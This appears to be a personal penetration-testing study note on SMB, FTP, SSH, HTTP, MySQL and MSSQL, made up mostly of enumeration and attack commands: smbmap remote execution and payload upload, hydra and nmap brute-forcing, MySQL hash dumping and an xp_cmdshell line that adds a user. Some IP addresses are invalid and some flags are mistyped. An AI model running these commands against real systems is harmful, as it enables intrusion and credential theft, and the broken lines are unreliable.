--- 
# Servers

## What's a server 
A _server_ is a computer program or device that provides a service to another computer program and its user, also known as the client.

![[Pasted image 20230402235809.png]]

## Why They are Important

### Openings For Bugs and Features
 This is why to ensure the effectiveness of the server security, we have to consider different layers — from identifying and managing potential issues in your network, to securing the server’s OS, protecting any software and applications hosted on your server, and at the most granular level, securing sensitive and regulated data hosted on the server.
 
### I’m in!
 Remote code execution (RCE) attacks are the worst in case of servers. It allows an attacker to remotely execute malicious code on a computer. The impact of an RCE vulnerability can range from malware execution to an attacker gaining full control over a compromised machine.
 
# [SMB](https://learn.microsoft.com/en-us/windows/win32/fileio/microsoft-smb-protocol-and-cifs-protocol-overview)

The Server Message Block (SMB) protocol is **a network file sharing protocol that allows applications on a computer to read and write to files and to request services from server programs in a computer network**. The SMB protocol can be used on top of its TCP/IP protocol or other network protocols.
![[Pasted image 20230403011848.png]]

SMB ports are generally **port numbers 139 and 445**. Port 139 is used by SMB dialects that communicate over NetBIOS

## Scan for SMB using Nmap

``` powershell
ipconfig
nmap 10.0.24.0/20 --open # option would show only exposed ports of the live hosts
net use * /delete
net use Z: \\10.0.22.92\C$ smbserver_771 /user:administrator
```

## [SMB Nmap Scripts](https://www.infosecademy.com/nmap-smb-scripts-enumeration/)

```bash 
nmap -p445 --script smb-protocols <target>
# Attempts to list the supported protocols and dialects of a SMB server.

nmap --script smb-enum-sessions.nse -p445 <host>
# Enumerates the users logged into a system either locally or through an SMB share.

nmap --script smb-security-mode.nse -p445 127.0.0.1 
#Returns information about the SMB security level determined by SMB.

nmap --script smb-enum-shares.nse -p445 <host>
# Finding open shares is useful to a penetration tester because there may be private files shared

nmap -p 445 <ip> --script smb-enum-shares,smb-ls 
# Attempts to retrieve useful information about files shared on SMB volumes $ (or smb-ls.shares) the share (or a colon-separated list of shares) to connect to (default: use shares found by smb-enum-shares)

nmap --script smb-enum-services.nse --script-args smbusername=<username>,smbpass=<password> -p445 <host>
# Retrieves the list of services running on a remote Windows system. Each service attribute contains service name, display name and service status of each service.

nmap --script smb-enum-users.nse -p445 <host>
# Attempts to enumerate the users on a remote Windows system, with as much information as possible

nmap --script smb-server-stats.nse -p445 <host>
# Attempts to grab the server's statistics over SMB and MSRPC, which uses TCP ports 445 or 139.

nmap --script smb-enum-domains.nse -p445 <host>
# Attempts to enumerate domains on a system, along with their policies


nmap --script smb-enum-groups.nse -p445 <host>
# Obtains a list of groups from the remote Windows system, as well as a list of the group's users. This works similarly to `enum.exe` with the `/G` switch.


--script-args smbusername=administrator,smbpass=smbserver_771
```

## [SMBMap](https://github.com/ShawnDEvans/smbmap)
SMBMap allows users to enumerate samba share drives across an entire domain. List share drives, drive permissions, share contents, upload/download functionality, file name auto-download pattern matching, and even execute remote commands. This tool was designed with pen testing in mind, and is intended to simplify searching for potentially sensitive data across large networks.

-   Allows users to enumerate samba share
-   Allows file upload/download/delete
-   Permission enumeration (writable share, meet Metasploit)
-   etc.

``` bash

smbmap -H 192.168.12.123 -u administrator -p asdf1234
#basic Autantication 

smbmap -H 172.16.0.24 -u Administrator -p 'changeMe' -r 'C$\Users'
# Non recursive path listing (ls):

smbmap -H 192.168.1.24 -u Administrator -p 'R33nisP!nckle' -L
#This feature was added to complement the file content searching feature

smbmap -H 192.168.12.123 -u administrator -d admin -p asdf1234
#spacify the domain

smbmap -H 192.168.12.123 -u administrator -d admin -p asdf1234  -x 'ipconfig /all' 
#Execute a command 

smbmap -H 192.168.12.123 -u administrator -p asdf1234 --download 'C$\temp\passwords.txt'
#Download a file from the remote system

smbmap -H 192.168.12.123 -u administrator -p asdf1234   --upload '/tmp/payload.exe' 'C$\temp\payload.exe'
#Upload a file to the remote system 

smbmap -H 192.168.12.123 -u administrator -p asdf1234 --delete 'C$\temp\msf.exe'
#Delete a remote file
```

## Samba

Samba is **an open-source utility that enables file sharing between machines running on a single network**. It enables Linux machines to share files with machines running different operating systems, such as Windows.

## [IPC$](https://learn.microsoft.com/en-US/troubleshoot/windows-server/networking/inter-process-communication-share-null-session)

The IPC$ share is also known as a null session connection. By using this session, Windows lets anonymous users perform certain activities, such as enumerating the names of domain accounts and network shares.

The IPC$ share is created by the Windows Server service. This special share exists to allow for subsequent named pipe connections to the server. The server's named pipes are created by built-in operating system components and by any applications or services that are installed on the system. When the named pipe is being created, the process specifies the security that is associated with the pipe, and then makes sure that access is only granted to the specified users or groups.

## Scan using Nmap
``` bash
nmap 187.45.5.2 -sV # can be a in TCP
nmap 187.45.5.2 -sU -sV # can be a in UDP
```

## Enumeration using Meataspolit 
``` bash
msfconsole 
msf5> use auxiliary/scanner/smb/smb_version
msf5> show options 
msf5> set rhosts 182.248.242.2
```

## Connect to an enumerated Samba
``` bash
nmblookup -A 192.256.58.12 # NetBIOS over TCP/IP client used to lookup NetBIOS names
smbclient -L 192.268.52.2 -N #ftp-like client to access SMB/CIFS resources on servers
rpcclient -U "" --N 192.168.2.5
```

## Using `rpcclient` command for enumeration

``` bash
rpcclient -U "" --N 192.168.2.5 #tool for executing client side MS-RPC functions
rpcclient> srvinfo
rpcclient> enumdomusers
```

## [enum4linux](https://github.com/CiscoCXSecurity/enum4linux)

A Linux alternative to enum.exe for enumerating data from Windows and Samba hosts.

Enum4linux is a tool for enumerating information from Windows and Samba systems. It attempts to offer similar functionality to enum.exe formerly available from [www.bindview.com](http://www.bindview.com/).

It is written in Perl and is basically a wrapper around the Samba tools smbclient, rpclient, net and nmblookup.

``` bash
enum4linux -o 158.25.25.2   #Get OS information

enum4linux -U 192.258.25.2  #get userlist

enum4linux -o  -u "" -p "" 198.252.5.2  #specify username and password to use (default "") 
enum4linux -r  -u "admin" -p "pass123" 198.252.5.2  #enumerate users
```

### Using hydra and  to smbmap bruteforce SMB
``` bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.212.2.1 smb
smbmap -H 192.168.5.2 -u admin -p password1
```

#### [Metasploit Guide SMB](https://docs.metasploit.com/docs/pentesting/metasploit-guide-smb.html)

![[Pasted image 20230404022913.png]]
> Notes:
> 1. `scanner/smb/smb_login` module is used to enumerate the SMB username and password 
> 2. `tar -xvf file_name.tar` used to untar a file  

# [FTP](<https://www.fortinet.com/resources/cyberglossary/file-transfer-protocol-ftp-meaning#:~:text=FTP%20(File%20Transfer%20Protocol)%20is,to%20communicate%20with%20each%20other.>)

**FTP (File Transfer Protocol)** is a standard network protocol used for the transfer of files from one host to another over a TCP-based network, such as the Internet.

FTP works by opening two connections that link the computers trying to communicate with each other. One connection is designated for the commands and replies that get sent between the two clients, and the other channel handles the transfer of data. During an FTP transmission, there are four commands used by the computers, servers, or proxy servers that are communicating. These are “send,” “get,” “change directory,” and “transfer.”

![[Pasted image 20230404024311.png]]

While transferring files, FTP uses three different modes: block, stream, and compressed. The stream mode enables FTP to manage information in a string of data without any boundaries between them. The block mode separates the data into blocks, and in the compress mode, FTP uses an algorithm called the Lempel-Ziv to compress the data.

``` bash 
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.213.157.3 ftp #enumerate username and password for ftp 
```


``` bash
nmap 192.213.157.3 —-script ftp-brute --script-args userdbs/root/users -p 21 
nmap 192.13.191.3 -p 21 --script ftp-anon

```


# [SSH](https://www.ssh.com/academy/ssh/protocol)
Secure shell (SSH) is **one of the most ubiquitous Linux tools**. It provides secure connectivity among workstations, servers, managed switches, routers, and any number of other devices. Linux and macOS include SSH, and it's easy to add to Windows.

![[Pasted image 20230404032716.png]]

### Connect to the SSH
``` bash
nc 198.222.25.2 22
#connect to the ssh

ssh root@198.65.2.1
#connect to the ssh
```

## SSH Recon
``` bash
nmap 198.222.25.2 22 --script ssh2-enum-algos -p 22 
#Reports the number of algorithms (for encryption, compression, etc.) that the target SSH2 server offers. If verbosity is set, the offered algorithms are each listed by type.

nmap host --script ssh-hostkey --script-args ssh_hostkey=full
# Shows SSH hostkeys. Shows the target SSH server's key fingerprint and (with high enough verbosity level) the public key itself. It records the discovered host keys in `nmap.registry` for use by other scripts. Output can be controlled with the `ssh_hostkey` script argument.`"full"`: The entire key, not just the fingerprint.

 nmap -p 22 --script ssh-auth-methods --script-args="ssh.user=<username>" <target>
#Returns authentication methods that a SSH server supports.
```

### SSH Dictionary Attack

#### Using hydra and nmap
``` bash
hydra -1 student -P /usr/share/wordlists/rockyou.txt 192.141.55.3 ssh

nmap 192.141.55.3 -p 22 —-script ssh-brute ——script-args userdb=/root/user
```

#### Using Metasploit
![[Pasted image 20230404031950.png]]

# HTTP

## [IIS Web Server](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/iis-internet-information-services)

Internet Information Services is an extensible web server created by Microsoft for use with the Windows NT family. IIS supports HTTP, HTTP/2, HTTPS, FTP, FTPS, SMTP and NNTP

![[Pasted image 20230405111414.png]]

### Enumerate HTTP
```bash
http 192.36.25.2
whatweb 192.36.25.2
dirb http://192.36.25.2
```

## Using Nmap Enumerating  HTTP
``` bash
nmap -sV --script=http-enum <target>
#Enumerates directories used by popular web applications and servers.

nmap -sV --script=http-headers --script-args path="index.html",useget= <target>
# Performs a HEAD request for the root folder ("/") of a web server and displays the HTTP headers returned.

nmap --script http-webdav-scan -p80,8080 <target>
# A script to detect WebDAV installations. Uses the OPTIONS and PROPFIND methods.
```

## In Terminal Web Browsers

### [Lynx](https://lynx.invisible-island.net/lynx_help/Lynx_users_guide.html)

```bash
sudo apt-get install lynx 
# a general purpose distributed information browser for the World Wide Web
```

### [Browsh](https://www.brow.sh/docs/introduction/)

Browsh is a purely text-based browser that can run in most TTY terminal environments and in any browser. The terminal client is currently more advanced than the browser client.
```bash
browsh -startup-url http://youtube.com
```

## Enumerate data from `robots.txt`

![[Pasted image 20230405124610.png]]


# SQL 

## MySQL

Open-source relational database management system. Its name is a combination of "My", the name of co-founder Michael Widenius's daughter My, and "SQL", the acronym for Structured Query Language.

### MySQL Directory Write Test
Enumerate writeable directories using the MySQL SELECT INTO DUMPFILE feature, for more information see the URL in the references. 
``` bahs
msf > use auxiliary/scanner/mysql/mysql_writable_dirs msf auxiliary(mysql_writable_dirs) > show options ... show and set options ... msf auxiliary(mysql_writable_dirs) > set RHOSTS ip-range msf auxiliary(mysql_writable_dirs) > exploit
```

### MySQL Password Hashdump
This module extracts the usernames and encrypted password hashes from a MySQL server and stores them for later cracking.

```bash 
msf > use auxiliary/scanner/mysql/mysql_hashdump 
msf auxiliary(mysql_hashdump) > show options ... show and set options ... 
msf auxiliary(scanner/mysql/mysql_hashdump) > **show advanced**
msf auxiliary(mysql_hashdump) > set RHOSTS ip-range 
msf auxiliary(mysql_hashdump) > exploit
```

## Using Nmap for MySQL enumeration

``` bash

nmap --script=mysql-info <target>
# Connects to a MySQL server and prints information such as the protocol and version numbers, thread ID, status, capabilities, and the password salt.

nmap -sV --script=mysql-empty-password <target>
# Checks for MySQL servers with an empty password for `root` or `anonymous`.

nmap --script=mysql-enum --script-args mysql-enum.timeout=value,creds.global=value <target>
#Performs valid-user enumeration against MySQL server using a bug discovered and published by Kingcope 

nmap --script=mysql-users --script-args mysqlpass=value,mysqluser=value <target>
# Attempts to list all users on a MySQL server.

nmap -sV --script=mysql-databases --script-args mysqlpass=value,mysqluser=value <target> 
#Attempts to list all databases on a MySQL server.

nmap -sV --script=mysql-variables --script-args mysqlpass=value,mysqluser=value <target>
# Attempts to show all variables on a MySQL server.

nmap -p 3306 --script mysql-audit --script-args "mysql-audit.username='root', \
  mysql-audit.password='foobar',mysql-audit.filename='nselib/data/mysql-cis.audit'"
# Audits MySQL database server security configuration against parts of the CIS MySQL v1.0.2 benchmark (the engine can be used for other MySQL audits by creating appropriate audit files).
  
nmap -p 3306 <ip> --script mysql-dump-hashes --script-args='username=root,password=secret'
# Dumps the password hashes from an MySQL server in a format suitable for cracking by tools such as John the Ripper. Appropriate DB privileges (root) are required.

nmap -p 3306 <ip> --script mysql-query --script-args='query="<query>"[,username=<username>,password=<password>]'
# Runs a query against a MySQL database and returns the results as a table.
```

#### Note: 
>   When using nmap script `mysql-info` and seeing `InteractiveClient` in the result, The default mode of MySQL Shell **provides interactive execution of database operations that you type at the command prompt**.




- Where does the MySQL files is stored 

>I connect_timeout: 10 
  **| datadir: /var/lib/mysql/**
  | date_format: %Y-wm-%d |
  | datetime_format: %Y-%m-%d SH:%i:%s

## Dictionary Attack to MySQL Database:

### 1. Using Metasploit 
``` bash
msf > use auxiliary/scanner/mysql/mysql_login 
msf auxiliary(mysql_login) > show options ... show and set options ...
msf auxiliary(mysql_login) > set RHOSTS ip-range 
msf auxiliary(mysql_login) > exploit
```

### Using hydra:
```bash
hydra -l root -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.99.154.3 my sql 
```

> LOAD_FILE(file_name) reads the file and returns the file contents as a string.

## Microsoft SQL

MS SQL Server is **a relational database management system (RDBMS) developed by Microsoft**. This product is built for the basic function of storing retrieving data as required by other applications. It can be run either on the same computer or on another across a network.
![[Pasted image 20230405203856.png]]


## Using Nmap for MS-SQL enumeration

``` bash

nmap -p 445 --script ms-sql-info <host>

nmap -p 1433 --script ms-sql-info --script-args mssql.instance-port=1433 <host>
# Attempts to determine configuration and version information for Microsoft SQL Server instances.

nmap -p 1433 --script ms-sql-ntlm-info <target>
# This script enumerates information from remote Microsoft SQL services with NTLM authentication enabled.

nmap -p 445 --script ms-sql-brute --script-args mssql.instance-all,userdb=customuser.txt,passdb=custompass.txt <host>

nmap -p 1433 --script ms-sql-brute --script-args userdb=customuser.txt,passdb=custompass.txt <host>
# Performs password guessing against Microsoft SQL Server (ms-sql). Works best in conjunction with the `broadcast-ms-sql-discover` script.

nmap -p 445 --script ms-sql-empty-password --script-args mssql.instance-all <host>

nmap -p 1433 --script ms-sql-empty-password <host>
#Attempts to authenticate to Microsoft SQL Servers using an empty password for the sysadmin (sa) account.

nmap -p 1433 <ip> --script ms-sql-dump-hashes
# Dumps the password hashes from an MS-SQL server in a format suitable for cracking by tools such as John-the-ripper. In order to do so the user needs to have the appropriate DB privileges.

nmap -p 445 --script ms-sql-discover,ms-sql-empty-password,ms-sql-xp-cmdshell <host>

nmap -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=sa,mssql.password=sa,ms-sql-xp-cmdshell.cmd="net user test test /add" <host>
# Attempts to run a command using the command shell of Microsoft SQL Server (ms-sql).
```

### Microsoft SQL Server Configuration Enumerator - Metasploit
This module will perform a series of configuration audits and security checks against a Microsoft SQL Server database. For this module to work, valid administrative user credentials must be supplied.

``` bash
msf > use auxiliary/admin/mssql/mssql_enum 
msf auxiliary(mssql_enum) > show targets ... a list of targets ... 
msf auxiliary(mssql_enum) > set TARGET target-id 
msf auxiliary(mssql_enum) > show options ... show and set options ... 
msf auxiliary(mssql_enum) > exploit
```

### MSSQL Login Utility - Metasploit
This module simply queries the MSSQL instance for a specific user/pass (default is sa with blank).

```
msf > use auxiliary/scanner/mssql/mssql_login
msf auxiliary(mssql_login) > show options
    ... show and set options ...
msf auxiliary(mssql_login) > set RHOSTS ip-range
msf auxiliary(mssql_login) > exploit
```

### Microsoft SQL Server Command Execution - Metasploit
This module will execute a Windows command on a MSSQL/MSDE instance via the xp_cmdshell (default) or the sp_oacreate procedure (more opsec safe, no output, no temporary data table). A valid username and password is required to use this module.

```
msf > use auxiliary/admin/mssql/mssql_exec
msf auxiliary(mssql_exec) > show targets
    ... a list of targets ...
msf auxiliary(mssql_exec) > set TARGET target-id
msf auxiliary(mssql_exec) > show options
    ... show and set options ...
msf auxiliary(mssql_exec) > exploit
```
